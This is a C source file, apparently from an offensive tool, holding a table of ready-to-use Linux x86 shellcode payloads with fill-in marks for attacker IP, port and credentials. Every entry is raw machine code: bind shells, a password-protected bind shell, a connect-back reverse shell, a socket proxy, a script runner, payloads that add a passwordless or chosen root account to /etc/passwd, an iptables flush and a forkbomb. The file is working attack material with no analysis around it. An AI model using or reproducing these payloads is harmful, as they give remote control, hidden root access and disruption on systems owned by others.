// List of payload struct

/* payload structure:

struct payload {
    char *description;
    char *shellcode;
};

*/


//characters used for personalization

const char  ip_mark =       'A',
            port_mark =     'B',
            username_mark = 'C',
            password_mark = 'D',
            interp_mark =   'E',
            script_mark =   'F';



struct payload payloads[] = {

#ifdef linux_x86

    // LINUX 32

    { "bind /bin/sh to the provided port (require -y)", "\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x31\xd2\x52\x66\x68" "BB" "\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\x89\xe1\x89\xc6\x6a\x02\x5b\x6a\x66\x58\xcd\x80\x6a\x66\x58\x6a\x04\x5b\xcd\x80\x31\xc9\x51\x51\x56\x89\xe1\x6a\x05\x5b\x6a\x66\x58\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" },

    { "fork() + bind /bin/sh to the provided port (require -y)", "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc1\x31\xc0\x31\xdb\x50\x50\x50\x66\x68" "BB" "\xb3\x02\x66\x53\x89\xe2\xb3\x10\x53\xb3\x02\x52\x51\x89\xca\x89\xe1\xb0\x66\xcd\x80\x31\xdb\x39\xc3\x74\x05\x31\xc0\x40\xcd\x80\x31\xc0\x50\x52\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x89\xd7\x31\xc0\x31\xdb\x31\xc9\xb3\x11\xb1\x01\xb0\x30\xcd\x80\x31\xc0\x31\xdb\x50\x50\x57\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80\x39\xc3\x75\x40\x31\xc0\x89\xfb\xb0\x06\xcd\x80\x31\xc0\x31\xc9\x89\xf3\xb0\x3f\xcd\x80\x31\xc0\x41\xb0\x3f\xcd\x80\x31\xc0\x41\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8b\x54\x24\x08\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x31\xc0\x89\xf3\xb0\x06\xcd\x80\xeb\x99" },

    { "bind /bin/sh to tcp port with password authentication" , "\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x66\x68" "BB" "\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\x89\xe1\x89\xc6\x43\xb0\x66\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x89\xe1\x43\xb0\x66\xcd\x80\x96\x52\x68\x72\x64\x3a\x20\x68\x73\x73\x77\x6f\x66\x68\x50\x61\x89\xe7\x6a\x0a\x57\x56\x89\xe1\xb3\x09\xb0\x66\xcd\x80\x52\x6a\x08\x8d\x4c\x24\x08\x51\x56\x89\xe1\xb3\x0a\xb0\x66\xcd\x80\x87\xf3\x52\x68" "DDDD" "\x68" "DDDD" "\x89\xe7\x8d\x74\x24\x1c\x89\xd1\x80\xc1\x08\xfc\xf3\xa6\x74\x04\xf7\xf0\xcd\x80\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" },

    { "/bin/sh connect back (require -x, -y)", "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51\x68" "AAAA" "\x66\x68" "BB" "\xb1\x02\x66\x51\x89\xe7\xb3\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80" },

    { "tcp socket proxy", "\xe8\xff\xff\xff\xff\xc6\x4e\x5e\x81\xc6\x18\xfc\xff\xff\xeb\x48\x89\xc3\x6a\x03\x59\xb0\xdd\xcd\x80\x56\x89\xde\x80\xcc\x08\x6a\x04\x59\xb0\xdd\xcd\x80\x93\x5e\xc3\x89\xc2\x83\xe0\x1f\xc1\xea\x05\x8d\x8e\x78\xff\xff\xff\x0f\xab\x04\x91\xc3\x93\xb0\x03\x8d\x8e\x48\xf4\xff\xff\x66\xba\x01\x08\xcd\x80\xc3\x93\xb0\x04\x8d\x8e\x48\xf4\xff\xff\xcd\x80\xc3\x8d\xbe\xf8\xfe\xff\xff\x31\xc0\x31\xc9\x66\xb9\x01\x01\xf3\xaa\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5a\x68\x7e\xff\xfe\xff\x81\x04\x24\x01\x01\x01\x01\x68\x81\x04\x24\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\xb3\x04\xb0\x66\xcd\x80\x5a\x50\x50\x52\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\x46\xfc\xe8\x5b\xff\xff\xff\xe8\x6f\xff\xff\xff\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x43\x5f\x68\x81\x04\x24\x68\x81\x04\x24\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x58\x89\x46\xf8\xe8\x19\xff\xff\xff\xe8\x2d\xff\xff\xff\x8b\x5e\xfc\x8b\x4e\xf8\x6a\x01\x53\x51\x6a\x02\x51\x53\x39\xd9\x7e\x02\x89\xcb\x56\x43\x8d\x8e\x78\xff\xff\xff\x31\xd2\x31\xf6\x31\xff\xb0\x8e\xcd\x80\x5e\x58\x50\x89\xc2\x83\xe0\x1f\xc1\xea\x05\x8d\x8e\x78\xff\xff\xff\x0f\xa3\x04\x91\x73\x04\x59\x59\xeb\x32\x58\x50\xe8\xe5\xfe\xff\xff\x58\x31\xff\x47\x83\x7c\x24\x04\x02\x74\x02\xf7\xdf\x01\xf8\xe8\xe4\xfe\xff\xff\x39\xc0\x89\xc2\x58\x31\xff\x47\x83\x3c\x24\x02\x75\x02\xf7\xdf\x01\xf8\xe8\xdd\xfe\xff\xff\x59\xe2\xb1\xeb\x88" },

    { "script execution (require -i -c -C), creates a file in the process pwd that you should remove", "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\x31\xf6\x50\x68\x30\x2e\x70\x6c\x68\x70\x74\x30\x30\x68\x73\x63\x72\x69\x89\xe3\xb0\x05\xb1\x41\xcd\x80\xeb\x38\x89\xde\x89\xc3\x5f\x57\x31\xc9\x31\xc0\xf7\xd1\xf2\xae\xf7\xd1\x49\x5f\x89\xc8\x89\xf9\x89\xc2\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x89\xf3\xb0\x0f\x66\xb9\xfc\x01\xcd\x80\xb0\x0b\x31\xc9\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc3\xff\xff\xff" "#!E\nF" },

    { "add root user r00t with no password - Kris Katterjohn",   "\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x89\xc3\x6a\x04\x58\x31\xd2\x52\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74\x89\xe1\x6a\x0c\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80" },

    { "add user with password (uid:0 gid:0) (require -z, -o)", "\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x89\xc3\x6a\x04\x58\x31\xd2\x52\x68\x3a\x78\x3a\x3a\x68\x3a\x30\x3a\x30" "\x68" "DDDD" "\x68" "DDDD" "\x68" "CCC" "\x3a\x89\xe1\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80" },

    { "forks an HTTP Server on port tcp/8800 - http://xenomuta.tuxfamily.org/", "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x74\x22\x31\xc0\xfe\xc0\xcd\x80\x59\xb2\x1b\xcd\x80\xb0\x06\x89\xf3\xcd\x80\xb0\x01\x31\xdb\xcd\x80\x5e\xb0\x66\xfe\xc3\x89\xe1\xcd\x80\xff\xe6\x99\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\xe8\xe5\xff\xff\xff\x89\xc7\x31\xd2\x52\x66\x68\x22\x60\x66\x53\x89\xe1\x6a\x10\x51\x57\xe8\xcf\xff\xff\xff\xfe\xc3\x6a\x05\x57\xe8\xc5\xff\xff\xff\x31\xc9\x52\x52\x57\xe8\xbb\xff\xff\xff\x89\xc6\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x74\x10\x31\xc0\xb0\x06\x89\xf3\xcd\x80\x31\xc0\x31\xdb\xb3\x04\xeb\xda\x89\xf3\xb0\x04\xe8\x85\xff\xff\xff\x48\x54\x54\x50\x2f\x31\x2e\x30\x20\x32\x30\x30\x0d\x0a\x0d\x0a\x3c\x68\x31\x3e\x3a\x29\x3c\x2f\x68\x31\x3e" },

    { "serial port busybox binding - phar@stonedcoder.org mdavis@ioactive.com", "\x31\xd2\x31\xc0\x6a\x02\x59\x66\xb8\x53\x30\x50\x68\x2f\x74\x74\x79\x68\x2f\x64\x65\x76\x89\xe3\x6a\x05\x58\x89\xc6\xcd\x80\x89\xc6\x31\xc9\x89\xf3\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf3\x66\xb8\x73\x68\x50\x89\xe1\x52\x51\x89\xe1\x52\x68\x79\x62\x6f\x78\x68\x2f\x62\x75\x73\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80" },

    { "iptables -F  - UnboundeD", "\x31\xd2\x52\x66\x68\x2d\x46\x89\xe6\x52\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x89\xe7\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x52\x56\x57\x89\xe1\x31\xc0\xb0\x0b\xcd\x80" },

    { "forkbomb (just for fun...) - Kris Katterjohn", "\x6a\x02\x58\xcd\x80\xeb\xf9" },

    { "open cd-rom loop (follows /dev/cdrom symlink) - izik@tty64.org", "\x6a\x05\x58\x31\xc9\x51\xb5\x08\x68\x64\x72\x6f\x6d\x68\x65\x76\x2f\x63\x68\x2f\x2f\x2f\x64\x89\xe3\xcd\x80\x89\xc3\x66\xb9\x09\x53\xb0\x36\xcd\x80\xeb\xfa" },

    { "audio (knock knock knock) via /dev/dsp - Cody Tubbs (pigspigs@yahoo.com)", "\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0f\x31\xc9\x66\xb9\x1c\x02\x80\x36\x03\x46\xe2\xfa\xea\xb8\x03\x03\x03\x2c\x61\x6a\x6d\x2c\x70\x6b\x03\x7d\x03\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x7f\x79\x75\x76\x76\x77\x72\x6e\x69\x68\x6d\x70\x76\x76\x72\x6e\x69\x64\x65\x60\x63\x5e\x58\x58\x5e\x5d\x5d\x5e\x5c\x61\x64\x6e\x70\x78\xa5\xaf\xb1\xb5\xbf\xbc\xc0\xc6\xc6\xc1\xc2\xbd\xbe\xb9\xbb\xb6\xac\xaa\xa0\x6d\x6f\x66\x6a\x69\x64\x55\x26\x33\x4d\x54\x5d\x43\x38\x35\x46\x40\x63\x60\x61\x55\x48\x49\x4d\x5d\x66\x6e\x6a\x64\x63\x59\x54\x63\x69\x6f\x70\x7a\x7b\x77\x7b\x79\x75\x71\x6d\x72\x72\x70\x71\x72\x6d\x72\x70\x70\x70\x79\x76\x6c\x6d\x6f\x6e\x68\x70\x75\x6e\x65\x65\x69\x68\x72\x75\x7d\x7f\x7e\x7d\x7f\x79\x78\x78\x7e\x79\x7e\x7d\x7f\x74\x75\x77\x70\x75\x79\x7f\x78\x7a\x75\x71\x73\x72\x09\x03\x2c\x67\x66\x75\x2c\x67\x70\x73\x03\x82\xef\x64\x28\x03\x03\x8a\xf5\x56\x8a\xe6\x80\xef\x1f\x54\x55\x50\xeb\x03\x03\x03\x03\x58\x82\xc0\xb9\x12\x03\x03\xc4\x46\xfb\x03\x03\x03\x03\xc4\x46\xff\x03\x03\x03\x03\x8e\x80\x76\xee\xfc\xfc\x8a\x46\xfb\x8e\xb8\x7e\xee\xfc\xfc\x8e\x90\x93\xee\xfc\xfc\x8a\x56\xeb\x8e\x88\x24\xed\xfc\xfc\x8a\xcd\xbb\x06\x03\x03\x03\xba\x02\x03\x03\x03\xb9\x83\x02\x03\x03\x50\x8a\xf0\xce\x83\x8a\x46\xf7\xbb\x2a\x03\x03\x03\x88\x76\xf7\x50\x8a\xf0\xce\x83\x8a\x46\xe7\xbb\x07\x03\x03\x03\x88\x76\xe7\x88\x4e\xeb\xb9\x95\x03\x03\x03\x50\x8a\xf0\xce\x83\xbb\x07\x03\x03\x03\x50\x8a\xf0\xce\x83\xc4\x46\xf3\x03\x03\x03\x03\xbb\x07\x03\x03\x03\x88\x76\xe7\x8a\xfa\xb9\x02\x03\x03\x03\x50\x8a\xf0\xce\x83\xfc\x46\xf3\x82\x7e\xf3\x54\x01\x03\x03\x7d\xe3\xbb\x07\x03\x03\x03\x88\x4e\xeb\xb9\x95\x03\x03\x03\x50\x8a\xf0\xce\x83\xbb\x07\x03\x03\x03\x50\x8a\xf0\xce\x83\xc4\x46\xf3\x03\x03\x03\x03\x93\xbb\x07\x03\x03\x03\x88\x76\xe7\x8a\xfa\xb9\x02\x03\x03\x03\x50\x8a\xf0\xce\x83\xfc\x46\xf3\x82\x7e\xf3\x54\x01\x03\x03\x7d\xe3\xbb\x07\x03\x03\x03\x88\x4e\xeb\xb9\x95\x03\x03\x03\x50\x8a\xf0\xce\x83\xbb\x07\x03\x03\x03\x50\x8a\xf0\xce\x83\xbb\x05\x03\x03\x03\x50\x8a\xf0\xce\x83\xbb\x05\x03\x03\x03\x88\x76\xf7\x50\x8a\xf0\xce\x83\xbb\x45\x03\x03\x03\x32\xf5\x32\xca\x50\x8a\xf0\xce\x83\x8e\x7e\xfb\xbb\x08\x03\x03\x03\x88\x76\xfb\x8a\xfa\x32\xd1\x50\x8a\xf0\xce\x83\x32\xc3\x8e\x66\xdb\x58\x5d\x5c\xca\xc0\x93\x69" },




#endif

    { NULL, NULL },
};
